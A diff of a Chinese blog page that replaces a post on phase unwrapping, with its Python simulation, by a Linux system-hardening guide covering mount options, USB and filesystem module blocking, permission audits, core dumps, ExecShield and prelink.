+<h2 id="限制分区挂载参数">限制分区挂载参数</h2><p>系统分区挂载时能指定参数，限制分区上文件能做什么。这些参数在<code>/etc/fstab</code>中设置，这些措施能让特定类型的恶意行为更加困难。</p>
+<h3 id="想非Root分区添加nodev选项">想非Root分区添加nodev选项</h3><p>编辑<code>/etc/fstab</code>，我们关注列2(挂载点),3(文件系统类型),4(挂载参数)。给所有满足下列条件的行：</p>
 <ul>
-<li>计算相位差分$D(i) = \psi(i+1)-\psi(i), i=0,\ldots,N-2$</li>
-<li>计算包裹的相位差分$\Delta(i) = \Delta{D(i)}, i=0,\ldots,N-2$</li>
-<li>初始化初值$\varphi(0)= \psi(0)$</li>
-<li>累加解包裹$\varphi(i) = \psi(i) + \Delta(i)$</li>
+<li>文件系统是<code>ext2</code>或<code>ext3</code></li>
+<li>挂载点不是<code>/</code></li>
 </ul>
-<p>Itoh的方法很简单实用，但受到两个重要因素的影响：相位失真和噪声。下面仿真两种情况的影响。</p>
-<h2 id="仿真">仿真</h2><p>对正弦波相位函数(间谐波，一切波的基础)</p>
-<p>$$\varphi(t) = 10\sin(10t), 0 \leq t \leq 1$$</p>
-<p>通过计算可以得知，使之不产生相位失真，区间内至少有32个采样点:</p>
-<p>对相位变化有</p>
-<p>$$\Delta \varphi = \dot{\varphi}\Delta t$$</p>
-<p>其中 $\dot{\varphi} = d\varphi / dt = 100\cos10t$ ，可看出相位在 $n\pi/10$ 取得极值，加上条件：</p>
-<p>$$\left\vert\Delta \varphi\right\vert \lt \pi$$</p>
-<p>则</p>
-<p>$$\left\vert \frac{100}{N} \cos 10t \right\vert \lt \pi$$</p>
-<p>得</p>
-<p>$$N \gt 31.83$$</p>
-<p>则对这个函数如果采样率低于32就会产生相位失真。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># &lt;nbformat&gt;3.0&lt;/nbformat&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># phase function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pf</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span> * np.sin(<span class="number">10</span> * x)</span><br><span class="line"><span class="comment"># wrap function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> np.arctan2(np.sin(x), np.cos(x))</span><br><span class="line"><span class="comment"># unwrap function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap_diff</span><span class="params">(x)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> wrap(np.diff(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unwrap</span><span class="params">(x)</span>:</span></span><br><span class="line">    y = x</span><br><span class="line">    y[<span class="number">0</span>] = x[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x) - <span class="number">1</span>):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        y[i] = y[i - <span class="number">1</span>] + wrap_diff(x)[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> np.array(y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise</span><span class="params">(x, snr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + np.random.normal(loc=<span class="number">0.0</span>, scale = np.sqrt(np.max(x) / <span class="number">2</span> ** snr), size=len(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_unwrap</span><span class="params">(x,y,y_w,t,p)</span>:</span></span><br><span class="line">    plt.ylim((-<span class="number">12</span>,<span class="number">12</span>))</span><br><span class="line">    plt.ylabel(<span class="string">"Phase in Radians"</span>)</span><br><span class="line">    p_w, = plt.plot(x, y_w,<span class="string">'o:'</span>)</span><br><span class="line">    p_o, = plt.plot(t,p,<span class="string">':'</span>)</span><br><span class="line">    p_u, = plt.plot(x,y,<span class="string">'s'</span>)</span><br><span class="line">    plt.legend([p_w, p_o, p_u], [<span class="string">"sampled wrapped phase"</span>, <span class="string">"original phase function"</span>, <span class="string">"unwrapped phase"</span>])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;headingcell level=1&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当取样点为num时</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Origin</span></span><br><span class="line">t = np.arange(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0.01</span>)</span><br><span class="line">p = pf(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># plot</span></span><br><span class="line"><span class="comment">## num 50</span></span><br><span class="line">plt.subplot(<span class="number">311</span>)</span><br><span class="line">plt.title(<span class="string">"num = 50"</span>)</span><br><span class="line"><span class="comment"># sampled data</span></span><br><span class="line">num = <span class="number">50</span></span><br><span class="line">x = np.linspace(<span class="number">0</span>,<span class="number">1</span>,num)</span><br><span class="line"><span class="comment"># wrapped phase</span></span><br><span class="line">y_w = wrap(pf(x))</span><br><span class="line"><span class="comment"># unwrapped wraped phase</span></span><br><span class="line">y = unwrap(wrap(pf(x)))</span><br><span class="line">show_unwrap(x, y, y_w, t, p)</span><br><span class="line"><span class="comment">## num = 32</span></span><br><span class="line">plt.subplot(<span class="number">312</span>)</span><br><span class="line">plt.title(<span class="string">"num = 32"</span>)</span><br><span class="line"><span class="comment"># sampled data</span></span><br><span class="line">num = <span class="number">32</span></span><br><span class="line">x = np.linspace(<span class="number">0</span>,<span class="number">1</span>,num)</span><br><span class="line"><span class="comment"># wrapped phase</span></span><br><span class="line">y_w = wrap(pf(x))</span><br><span class="line"><span class="comment"># unwrapped wraped phase</span></span><br><span class="line">y = unwrap(wrap(pf(x)))</span><br><span class="line">show_unwrap(x, y, y_w, t, p)</span><br><span class="line"><span class="comment">## num = 31</span></span><br><span class="line">plt.subplot(<span class="number">313</span>)</span><br><span class="line">plt.title(<span class="string">"num = 31"</span>)</span><br><span class="line"><span class="comment"># sampled data</span></span><br><span class="line">num = <span class="number">31</span></span><br><span class="line">x = np.linspace(<span class="number">0</span>,<span class="number">1</span>,num)</span><br><span class="line"><span class="comment"># wrapped phase</span></span><br><span class="line">y_w = wrap(pf(x))</span><br><span class="line"><span class="comment"># unwrapped wraped phase</span></span><br><span class="line">y = unwrap(wrap(pf(x)))</span><br><span class="line">show_unwrap(x, y, y_w, t, p)</span><br><span class="line">plt.xlabel(<span class="string">"Relative Time"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;headingcell level=1&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 噪声</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># noise influence</span></span><br><span class="line">x = np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">200</span>)</span><br><span class="line">y = pf(x)</span><br><span class="line">y_10 = unwrap(wrap(noise(y,<span class="number">10</span>))) + <span class="number">20</span></span><br><span class="line">y_5 = unwrap(noise(wrap(y), <span class="number">5</span>)) + <span class="number">40</span></span><br><span class="line">y_2 = unwrap(noise(wrap(y), <span class="number">2</span>)) + <span class="number">60</span></span><br><span class="line">y_1 = unwrap(noise(wrap(y), <span class="number">1</span>)) + <span class="number">80</span></span><br><span class="line"><span class="comment"># plot</span></span><br><span class="line">plt.xlabel(<span class="string">"Relative Time"</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Phase in Radians"</span>)</span><br><span class="line">p_o, = plt.plot(t,p)</span><br><span class="line">p_1, = plt.plot(x,y_1,<span class="string">'--'</span>)</span><br><span class="line">p_2, = plt.plot(x,y_2,<span class="string">'-.'</span>)</span><br><span class="line">p_5, = plt.plot(x,y_5,<span class="string">':'</span>)</span><br><span class="line">p_10, = plt.plot(x,y_10,<span class="string">':'</span>)</span><br><span class="line">plt.legend([p_o, p_1, p_2, p_5, p_10], [<span class="string">"Origin"</span>, <span class="string">"SNR=1"</span>, <span class="string">"SNR=2"</span>, <span class="string">"SNR=5"</span>, <span class="string">"SNR=10"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br></pre></td></tr></table></figure>
-<p>我们可以看到：</p>
-<ul>
-<li><p>在采样率低于某一关键值32时基本没法解出正确相位。</p>
-<p>  <img src="https://raw.github.com/reverland/phase-unwrapping-notes/master/image/phase-aliasing.jpg" alt="phase aliasing"></p>
-</li>
-<li>信噪比越低，解包裹效果越差。<br>  <img src="https://raw.github.com/reverland/phase-unwrapping-notes/master/image/noise.jpg" alt="noise"></li>
-</ul>
-<h2 id="Summary">Summary</h2><p>如果是二维相位去包裹问题，还有个奇点的问题。噪音、相位失真、奇点，似乎是所有相位解缠算法必须面对的三大问题。</p>
-<p>相关Ipython Notebook文件和Einstein和Monalisa的图像<a href="https://lhtlyybox.googlecode.com/files/phase.zip" target="_blank" rel="external">在此下载</a></p>
-
+<p>在列4添加<code>,nodev</code>。</p>
+<p><code>nodev</code>参数防止用户在任何不该挂载设备的分区上挂载设备。只有<code>/dev</code>应该挂载设备，所以不要在<code>/</code>上设置这个参数。</p>
+<p>然而，如果系统程序在<code>chroot jail</code>中运行，需要在<code>chroot</code>文件夹内创建设备文件，这个建议就不这么适用。</p>
+<h3 id="向可以出存储分区添加nodev，nosuid和noexec选项">向可以出存储分区添加nodev，nosuid和noexec选项</h3><p>编辑<code>/etc/fstab</code>，如果行中包含<code>floppy</code>或者<code>cdrom</code>字样就说明这些是可移除媒体的文件系统。</p>
+<p>对其中每个找到的挂载点，在列4添加<code>noexec,nodev,nosuid</code>参数。</p>
+<p>挂载到可移除介质的文件系统也为恶意可执行文件提供了潜在的进入系统方式，因此应该用最小权限挂载。用户不能引入任意设备或者suid程序。另外<code>noexec</code>禁止用户直接在可移除介质上运行程序，这能阻止一些特殊蠕虫和恶意代码。</p>
+<p><code>/etc/fstab</code>上的挂载点也许在某些典型硬件的现代系统上不存在。动态挂载机制需要通过其它方式控制(也许可以也许不能控制挂载选项)。如果你需要在可移动介质中执行什么，就别加<code>noexec</code>.</p>
+<h3 id="向临时存储分区添加nodev，nosuid和noexec参数">向临时存储分区添加nodev，nosuid和noexec参数</h3><p>临时存储分区比如<code>/tmp</code>和<code>/dev/shm</code>为恶意程序执行提供了潜在存储空间。尽管添加这些参数不能防止其它分区的程序解释存储在这些分区的代码，但对某些恶意代码也有作用。</p>
+<p>编辑<code>/etc/fstab</code>，向列4添加<code>,nodev,nosuid,noexec</code>。</p>
+<h3 id="绑定挂载/var/tmp到/tmp">绑定挂载/var/tmp到/tmp</h3><p>编辑<code>/etc/fstab</code>，添加以下行：</p>
+<pre><code>/tmp    /var/tmp    none    rw,noexec,nosuid,nodev,bind <span class="number">0</span> <span class="number">0</span>
+</code></pre><p>这一行绑定挂载任何人都可写的<code>/var/tmp</code>目录到<code>/tmp</code>，使用用上文中用的选项。参见mount的man页面获取更多关于绑定挂载的信息。</p>
+<h2 id="限制动态挂载和卸载文件系统">限制动态挂载和卸载文件系统</h2><p>linux系统提供了各种措施自动增加和删除运行系统的文件系统，这些措施很方便，也带来了诸如允许非授权用户引入任意文件系统或者，软件自动挂载措施的缺陷允许攻击者侵入系统。</p>
+<p>使用这些措施的时候要十分小心，找到更好的配置管理方式和实行用户教育可能减少风险。</p>
+<h3 id="限制控制台设备接入">限制控制台设备接入</h3><p>默认系统配置批准控制台用户提升到root用户权限，包括暂时拥有大部分系统设备。如果不必要，禁用这个权限，限制到root。</p>
+<p>将设备所有者限定到root</p>
+<p>(RHEL6)中并无这些，神奇的消失了。Removed references to 50-default.perms, since this file was removed in Red Hat Enterprise Linux 6, per Bugzilla 630524.</p>
+<h3 id="禁用USB设备支持">禁用USB设备支持</h3><p>USB闪存或硬盘可能为攻击者物理接触系统拷贝大量数据提供便利。</p>
+<h4 id="禁止内核加载USB存储驱动">禁止内核加载USB存储驱动</h4><p>如果不让用USB设备，<code>modprobe</code>程序应该被设置为不自动加载USB存储驱动。</p>
+<pre><code><span class="id">#vi</span> /etc/modprobe.d/no-usb<span class="class">.conf</span>                           <span class="id">#Create</span> this file <span class="keyword">if</span> it doesn’t exist
+install usb-storage /bin/true                             <span class="hexcolor">#Add</span> this line
+:wq!
+</code></pre><p>这可以禁止modprobe加载usb-storage模块，但无法阻止管理员或其它程序使用insmod来加载模块。</p>
+<h4 id="移除USB存储驱动">移除USB存储驱动</h4><p>如果根本不需要使用USB存储设备，内核驱动就可以删除。</p>
+<pre><code>rm /<span class="class"><span class="keyword">lib</span>/<span class="title">modules</span>/<span class="title">kernelversion</span>(<span class="title">s</span>) /<span class="title">kernel</span>/<span class="title">drivers</span>/<span class="title">usb</span>/<span class="title">storage</span>/<span class="title">usb</span>-<span class="title">storage</span>.<span class="title">ko</span></span>
+</code></pre><p>每次更新内核后都要运行这个命令。<code>rpm -q --verify kernel</code>也会失败，不好的副作用。</p>
+<p>注意，如果一个带有usb驱动的自制内核被使用，该方法并不能防止USB存储设备被挂载。</p>
+<h4 id="在启动时禁用对USB的内核支持">在启动时禁用对USB的内核支持</h4><p>在内核启动参数中加入<code>nousb</code>参数</p>
+<p>注意！！！！！！！！！！！：这会让usb外接键盘鼠标打印机等设备无法使用。</p>
+<p>在<code>/etc/grub.conf</code>中加入<code>nousb</code>参数：</p>
+<pre><code>kernel <span class="regexp">/vmlinuz-version ro vga=ext root=/</span>dev<span class="regexp">/VolGroup00/</span>LogVol00 rhgb quiet nousb
+</code></pre><h4 id="禁止从USB设备启动">禁止从USB设备启动</h4><p>配置BIOS禁止从USB启动，设置BIOS或固件密码防止非授权的更改配置。</p>
+<h3 id="尽量禁用自动挂载">尽量禁用自动挂载</h3><p>如果<code>autofs</code>服务不是必要的，比如挂载NFS文件系统或可移动介质，禁用该服务。</p>
+<pre><code><span class="title">chkconfig</span> autofs <span class="built_in">off</span>
+</code></pre><p>其实用autofs自动挂载可移动介质也不常见，如果不用NFS就禁用服务。</p>
+<p>就算需要NFS，近乎总是可能在<code>/etc/fstab</code>配置静态文件系统挂载，而不是依靠自动挂载。</p>
+<h3 id="尽量禁用gnome自动挂载">尽量禁用gnome自动挂载</h3><p>略</p>
+<h3 id="禁止挂载不常见文件系统类型">禁止挂载不常见文件系统类型</h3><p>在<code>/etc/modprobe.d/</code>下随意建个文件比如<code>uncomman_fs.conf</code>:</p>
+<pre><code><span class="operator"><span class="keyword">install</span> cramfs /<span class="keyword">bin</span>/<span class="literal">true</span>
+<span class="keyword">install</span> freevxfs /<span class="keyword">bin</span>/<span class="literal">true</span>
+<span class="keyword">install</span> jffs2 /<span class="keyword">bin</span>/<span class="literal">true</span>
+<span class="keyword">install</span> hfs /<span class="keyword">bin</span>/<span class="literal">true</span>
+<span class="keyword">install</span> hfsplus /<span class="keyword">bin</span>/<span class="literal">true</span>
+<span class="keyword">install</span> squashfs /<span class="keyword">bin</span>/<span class="literal">true</span>
+<span class="keyword">install</span> udf /<span class="keyword">bin</span>/<span class="literal">true</span></span>
+</code></pre><h3 id="尽可能禁用所有Gnome缩略图">尽可能禁用所有Gnome缩略图</h3><h2 id="确认重要文件和目录权限">确认重要文件和目录权限</h2><p>讨论了需要日常检查以确保没有有害的差异发生。</p>
+<h3 id="确认passwd，shadow，group和gshadow文件的权限">确认passwd，shadow，group和gshadow文件的权限</h3><pre><code>cd /etc
+chown root:root passwd shadow <span class="keyword">group</span> <span class="title">gshadow</span>
+chmod <span class="number">644</span> passwd <span class="keyword">group</span>
+<span class="title">chmod</span> <span class="number">400</span> shadow gshadow
+</code></pre><p>一般这是默认情况。</p>
+<h3 id="确认所有全局可写的目录设置sticky位">确认所有全局可写的目录设置sticky位</h3><p>找到所有本地分区上全局可写但未设置sticky位的文件夹。以下命令可以用来查找，其中<code>PART</code>是指定分区：</p>
+<pre><code><span class="built_in">find</span> PART -xdev -<span class="built_in">type</span> d \( -perm -<span class="number">0002</span> -a ! -perm -<span class="number">1000</span> \) -<span class="built_in">print</span>
+</code></pre><p>如果有任何输出目录<code>/dir</code>，用以下命令更改：</p>
+<pre><code>chmod +t /<span class="built_in">dir</span>
+</code></pre><p>sticky位设置后，只有文件夹的所有者可以删除其中的文件。</p>
+<h3 id="发现为授权的全局可写文件">发现为授权的全局可写文件</h3><p>以下命令找到全局可写文件(对某一分区<code>PART</code>)：</p>
+<pre><code><span class="built_in">find</span> PART -xdev -<span class="built_in">type</span> f -perm -<span class="number">0002</span> -<span class="built_in">print</span>
+</code></pre><p>如果发现确实不该设置全局可写，设置：</p>
+<pre><code>chmod o-w <span class="type">file</span>
+</code></pre><p>几乎不该出现全局可写的文件夹。</p>
+<h3 id="找到未授权的SUID/SGID系统可执行文件">找到未授权的SUID/SGID系统可执行文件</h3><p>以下命令找到所有分区<code>PART</code>上的setuid和setgid文件：</p>
+<pre><code><span class="built_in">find</span> PART -xdev \( -perm -<span class="number">4000</span> -o -perm -<span class="number">2000</span> \) -<span class="built_in">type</span> f -<span class="built_in">print</span>
+</code></pre><p>如果确定有不用设置suid或sgid的程序，设置：</p>
+<pre><code>chmod -s <span class="type">file</span>
+</code></pre><p>可以参考NSA Guide 32页表格决定。</p>
+<h3 id="找到和修复无主文件">找到和修复无主文件</h3><p>找到分区<code>PART</code>不属于任何有效用户组和用户的文件：</p>
+<pre><code>find PART -xdev <span class="string">\(</span> -nouser -o -nogroup <span class="string">\)</span> -<span class="built_in">print</span>
+</code></pre><p>如果有输出检查下是分配给某个用户和组还是删除文件。</p>
+<p>通常无主文件并不可被挖掘漏洞，但是通常意味系统进程出错。也许是一个入侵者造成的，或者不正确的软件安装或者不完整的软件移除，或者移除一个被删除的帐号失败。这些文件应该被修复，以防将来创建用户出现问题，因此这种问题需要重视。</p>
+<h3 id="确保所全局可写目录有合适的权限">确保所全局可写目录有合适的权限</h3><p>确保全局可写文件目录的权限是root或者其它系统账户。以下命令将发现和打印这些：</p>
+<pre><code><span class="built_in">find</span> PART -xdev -<span class="built_in">type</span> d -perm -<span class="number">0002</span> -uid +<span class="number">500</span> -<span class="built_in">print</span>
+</code></pre><p>如果有输出，搞明白为什么这些全局可写目录的拥有者不是root或者系统账户。</p>
+<p>允许用户账户拥有全局可写目录不合适，应该这将允许拥有者移除任何其它用户放进去的文件。</p>
+<h2 id="限制以危险模式运行的程序">限制以危险模式运行的程序</h2><p>这部分推荐提供广泛的保护，防止信息泄漏或者其它不当行为。这些保护被应用在系统初始化时和内核层，以抵御特定类型的没配置好或被入侵的程序。</p>
+<h3 id="设置daemon_umask">设置daemon umask</h3><p>编辑<code>/etc/sysconfig/init</code>，添加或改变以下行。</p>
+<pre><code><span class="built_in">umask</span> <span class="number">027</span>
+</code></pre><p>该文件包含在启动时应用到所有进程的设置。最起码系统umask是022,不然守护进程就会创建全局可写的文件。更严格的027保护临时文件、日志文件等不被未授权的非授权用户读取。</p>
+<p>如果特定daemon需要更宽松的umask，考虑为该守护进程单独设置例外，比如编辑启动脚本或者sysconfig文件</p>
+<h3 id="禁用吐核">禁用吐核</h3><p>在<code>/etc/security/limits.conf</code>中添加或更改以下行，限制所有用户吐核。</p>
+<pre><code><span class="bullet">*   </span>hard core 0
+</code></pre><p>并且，确保setuid程序不吐核，编辑<code>/etc/sysctl.conf</code>添加或改正以下行：</p>
+<pre><code>fs<span class="class">.suid_dumpable</span> = <span class="number">0</span>
+</code></pre><p>核文件是可执行文件的内存镜像，大多情况下只有开发者需要合法的存取这些文件。核内可能包含敏感信息或者占据大量磁盘空间。</p>
+<p>默认情况下，系统设置了软限制(soft limit)，以防止所有用户创建核文件。通过在<code>/etc/profile</code>中以下行实现：</p>
+<pre><code>ulimit -S -c <span class="number">0</span> &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span>
+</code></pre><p>然而这个限制不是强制的。仅能防止对用户会话中恼人的吐核，如果需要吐核，考虑限定到指定用户和组。参见<code>limit.conf</code>的man页面。</p>
+<h4 id="确保禁止suid吐核">确保禁止suid吐核</h4><p>使用<code>sysctl</code>检查：</p>
+<pre><code><span class="tag">sysctl</span> <span class="tag">fs</span><span class="class">.suid_dumpable</span>
+</code></pre><p>使用<code>-n</code>参数更利于写脚本检查这个值。</p>
+<h4 id="开启ExecShield">开启ExecShield</h4><p>ExecShield包含一系列内核特性，这些特性提供缓冲区移除攻击保护。这些特性包括随机放置栈和其它内存区域，阻止在应该放数据的区段中执行内存，对字符缓冲区特殊处理。</p>
+<p>为了让这些在启动时激活，添加以下行到<code>/etc/sysctl.conf</code>:</p>
+<pre><code>kernel<span class="class">.exec-shield</span> = <span class="number">1</span>
+kernel<span class="class">.randomize_va_space</span> = <span class="number">2</span>
+</code></pre><p>Execshield 使用所有x86平台的段特性来阻止内存中特定地址更高的地址执行。它在代码段描述符中写下一个地址作为限制，来控制代码在哪里能执行(对每一个进程的基础上)。当内核将一个进程的内存区域，比如对或者栈到高于这个地址时，硬件会阻止它执行。然而，不可能对所有不该执行的内存区域做到这点。<code>randomize_va_space</code>值为2一般为默认值，确保随机放置栈,、VDSO页面,、共享内存区域和数据段。</p>
+<h4 id="确保ExecShield已经启用">确保ExecShield已经启用</h4><p>使用sysctl确认当前系统中使用了这些特性：</p>
+<pre><code><span class="tag">sysctl</span> <span class="tag">kernel</span><span class="class">.exec-shield</span>
+<span class="tag">sysctl</span> <span class="tag">kernel</span><span class="class">.randomize_va_space</span>
+</code></pre><h3 id="启用32位系统的Execute_Disable(XD)或者No_Execute(NX)支持">启用32位系统的Execute Disable(XD)或者No Execute(NX)支持</h3><p>较新的x86 32位处理器支持在每个内存页面基础上的代码防止执行。通常在AMD处理器上这个特性嗯叫<code>NX</code>，在Intel处理器中叫<code>XD</code>。这个特性有助于防止缓冲区移除攻击。任何时候都该开启。其它处理器比如Itanium、Power和64位x86处理器开始就支持该特性。</p>
+<h4 id="检查是否处理器支持">检查是否处理器支持</h4><p>检查是否支持<code>PAE</code>和<code>NX</code>特性：</p>
+<pre><code>cat /<span class="keyword">proc</span>/cpuinfo
+</code></pre><p>如果支持，<code>flags</code>域内包含<code>pae</code>和<code>nx</code>。</p>
+<h4 id="在x86系统安装新内核">在x86系统安装新内核</h4><p>显然64位系统用不着<code>PAE</code>特性。<code>kernel-PAE</code>顺便开启了<code>NX</code>或<code>XD</code>支持。不要在cpu不支持这些特性的机器上装<code>kernel-PAE</code>：</p>
+<pre><code>yum <span class="keyword">install</span> kernel-PAE
+</code></pre><h4 id="在BIOS中开启NX或XD支持">在BIOS中开启NX或XD支持</h4><p>进入BIOS设置界面，一概在setup菜单，security部分，大概</p>
+<h3 id="配置prelink">配置prelink</h3><p>通过加载每个已经链接的必要符号的共享库到相同的位置，Prelink设计来减少进程启动时间。<code>/etc/sysconfig/prelink</code>文件描述了<code>/usr/sbin/prelink</code>程序会改动哪些文件以及更改这些文件的频率。</p>
+<p>cron任务可以每天运行来执行<code>prelink</code>程序，有两种类型的预链接：quick和full，full默认每十四天发生一次，重链接所有共享库和那些使用它们的二进制文件。快速模式每天运行，但只对改动的二进制文件和库进行。</p>
+<p>一旦二进制文件被预链接了，共享库地址不再会在进程基础上随机防止，就算<code>kernel.randomize_va_space</code>设置成1或2.这可不是我们想要的结果，由于其为攻击者的挖掘尝试提供了稳定的地址。</p>
+<h4 id="禁用prelink">禁用prelink</h4><p>配置<code>/etc/sysconfig/prelink</code>:</p>
+<pre><code><span class="setting">PRELINKING=<span class="value"><span class="keyword">no</span></span></span>
+</code></pre><h4 id="取消已经存在的预链接">取消已经存在的预链接</h4><p>执行以下命令：</p>
+<pre><code><span class="regexp">/usr/</span>sbin<span class="regexp">/prelink -ua</span>
+</code></pre>
             
           </span>
         
@@ -747,8 +2179,8 @@
             
               
                 
-                <a class="post-title-link" href="/python/2015/11/15/2012-10-30/" itemprop="url">
-                  斯普罗站最大风力预测
+                <a class="post-title-link" href="/linux/2014/11/17/linux-audit/" itemprop="url">
+                  linux安全审计
                 </a>
               
             
@@ -758,8 +2190,8 @@
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:30+08:00" content="2015-11-15">
-              2015-11-15
+            <time itemprop="dateCreated" datetime="2014-11-17T00:00:00+08:00" content="2014-11-17">
+              2014-11-17
             </time>
           </span>
 
@@ -768,8 +2200,8 @@
               &nbsp; | &nbsp; 分类于
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
                   </a>
                 </span>
 
@@ -784,8 +2216,8 @@
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/python/2015/11/15/2012-10-30/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/11/15/2012-10-30/" itemprop="commentsCount"></span>
+              <a href="/linux/2014/11/17/linux-audit/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/11/17/linux-audit/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -807,917 +2239,141 @@
         
           <span itemprop="articleBody">
             
-              <h1 id="斯普罗岛最大风速预测">斯普罗岛最大风速预测</h1><p>翻译自：<a href="http://scipy-lectures.github.com/intro/summary-exercises/stats-interpolate.html" target="_blank" rel="external">http://scipy-lectures.github.com/intro/summary-exercises/stats-interpolate.html</a></p>
-<p>这个练习目的在于预测每50年的最大风速，如果没有测量的话。可以获得的数据仅仅由位于丹麦的斯普罗气象站测量了21年。首先，统计步骤将给出，然后通过从scipy.interpolate模块中的函数演示。最后有兴趣的读者将被邀请用稍微不同的方法从原始数据计算结果。</p>
-<h2 id="统计方法">统计方法</h2><p>每年最大风速应该符合正态概率密度函数。然而，这个函数将并不会被估计，因为它从最大风速给出概率。这将是分位函数的角色，这个练习的目标将会是找到它。在当前模型，每五十年发生的最大风速被定义为%2上分位。</p>
-<p>根据定义，这个分位函数是累积分布函数的反函数，后者描述了一年的最大风速概率分布。在这个练习中。给定年<code>i</code>累积概率<code>p_i</code>被定义为<code>p_i = i/(N+1)</code>,其中N=21，有测量的年数。因此计算每年最大风速的累积概率将是可能的。从这些实验点，scipy.interpolate模块将在拟合分位函数时非常有用。最后这五十年的最大值将被从上%2分位数的累积概率函数中求得。</p>
-<h2 id="计算累积概率">计算累积概率</h2><p>每年的最大风力已经被计算并以numpy格式保存在文件<a href="http://scipy-lectures.github.com/_downloads/max-speeds.npy" target="_blank" rel="external">examples/max-speeds.npy</a>中，因此它们将通过numpy载入：</p>
